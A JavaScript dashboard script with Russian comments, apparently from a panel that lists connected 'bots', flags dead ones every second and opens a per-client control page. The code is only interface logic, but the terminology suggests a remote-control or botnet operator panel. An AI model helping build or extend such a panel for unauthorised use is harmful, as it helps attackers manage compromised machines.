/* frontend/dashboard/js/dashboard.js */

/* ==========================================================================
   1. ИМПОРТЫ И ГЛОБАЛЬНОЕ СОСТОЯНИЕ (Imports & State)
========================================================================== */

import { connectWebSocket } from './modules/websocket/connection.js';
import { getAllClients, checkDeadClients } from './modules/data/clients.js';
import { updateStats } from './modules/data/stats.js';
import { initializeSidebar } from './modules/ui/sidebar.js';
import { initializeHeader, applyStatusFilter, setActiveFilterUI, updateHeaderContext } from './modules/ui/header.js';
import { initializeSearch, applySearchFilter } from './modules/ui/search.js';
import { Renderer } from './modules/ui/renderer.js';

const state = {
    filter: 'all',
    search: '',
    tab: 'bots'
};

/* ==========================================================================
   2. ЯДРО СИНХРОНИЗАЦИИ (Core Sync Logic)
========================================================================== */

/** Оркестратор: фильтрует данные и заставляет Renderer их отрисовать */
const syncUI = () => {
    if (state.tab !== 'bots' && state.tab !== 'files') return;

    const isGrid = Renderer.getIsGridView();
    setActiveFilterUI(state.filter, isGrid);

    const rawData = getAllClients();
    const filtered = applyStatusFilter(rawData, state.filter);
    const searched = applySearchFilter(filtered, state.search);

    Renderer.render(searched);
};

/* ==========================================================================
   3. НАВИГАЦИЯ ПО ТАБАМ (Tab Management)
========================================================================== */

function showTab(name) {
    state.tab = name.toLowerCase().trim().replace('section-', '');

    // Переключение видимости HTML-секций
    document.querySelectorAll('.content-section').forEach(s => {
        const isTarget = s.id === `section-${state.tab}`;
        s.classList.toggle('hidden', !isTarget);
        s.classList.toggle('active', isTarget);
    });

    updateHeaderContext(state.tab);
    syncUI();
}

/* ==========================================================================
   4. ИНИЦИАЛИЗАЦИЯ ПРИ ЗАГРУЗКЕ (DOM Ready)
========================================================================== */

document.addEventListener('DOMContentLoaded', () => {
    // Настройка боковой панели
    initializeSidebar({ onTabChange: showTab });

    // Настройка шапки (вид, фильтры)
    initializeHeader({
        Renderer,
        onViewToggled: (isGrid) => {
            if (isGrid) state.filter = 'online';
            syncUI();
        },
        onFilterChange: (newFilter) => {
            state.filter = newFilter;
            syncUI();
        }
    });

    // Запуск системных модулей
    initializeSearch();
    connectWebSocket();

    // Проверка "мертвых" ботов каждую секунду
    setInterval(checkDeadClients, 1000);

    /* ==========================================================================
       5. ОБРАБОТЧИКИ СОБЫТИЙ (Event Listeners)
    ========================================================================== */

    // Клик по боту -> переход в панель управления
    document.addEventListener('click', e => {
        const row = e.target.closest('.client-row, .client-card');
        if (row && !e.target.closest('button')) {
            window.location.href = `../client_control/client_control.html?id=${row.dataset.clientId}`;
        }
    });

    // Реакция на ввод в поиске
    window.addEventListener('searchUpdated', e => {
        state.search = e.detail;
        syncUI();
    });

    // Глобальная перерисовка при любом обновлении данных
    ['clientsUpdated', 'clientUpdated', 'clientRemoved'].forEach(ev => {
        window.addEventListener(ev, syncUI);
    });

    // Стартовая вкладка
    showTab('bots');
});